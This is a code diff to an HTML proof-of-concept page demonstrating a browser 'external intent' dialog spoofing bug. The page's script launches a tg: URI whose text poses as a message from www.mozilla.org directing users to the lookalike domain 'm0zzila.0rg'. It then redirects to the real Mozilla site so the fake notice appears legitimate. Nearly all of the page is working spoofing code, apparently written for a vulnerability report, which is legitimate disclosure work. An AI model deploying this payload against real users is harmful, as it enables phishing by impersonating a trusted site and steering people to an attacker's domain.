@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>External Intent Message Spoofing PoC</title>
+  <title>External Intent Dialog Spoofing PoC</title>
   <style>
     body {
       font-family: system-ui, sans-serif;
@@ -11,30 +11,25 @@
     button {
       padding: 12px 16px;
       font-size: 16px;
-      cursor: pointer;
     }
   </style>
 </head>
 <body>
 
 <h2>External Intent Dialog Spoofing</h2>
-<p>Tap the button to trigger the PoC.</p>
-
-<button id="test">Trigger External Intent</button>
+<button id="test">Trigger PoC</button>
 
 <script>
 document.getElementById('test').onclick = () => {
 
-  // Step 1: Trigger external intent with injected message
-  location.href =
-    'tg:www.mozilla.org says:\n\n' +
-    'Mozilla under maintenance.\n' +
-    'Please visit m0zzila.0rg';
+  setTimeout(() => {
+    location.href = 'tg:www.mozilla.org says:                    mozilla under maintenance                go to m0zzila.0rg';
+  }, 300);
 
-  // Step 2: Redirect to legitimate site after intent
   setTimeout(() => {
     location.href = 'https://www.mozilla.org';
   }, 800);
+
 };
 </script>
 
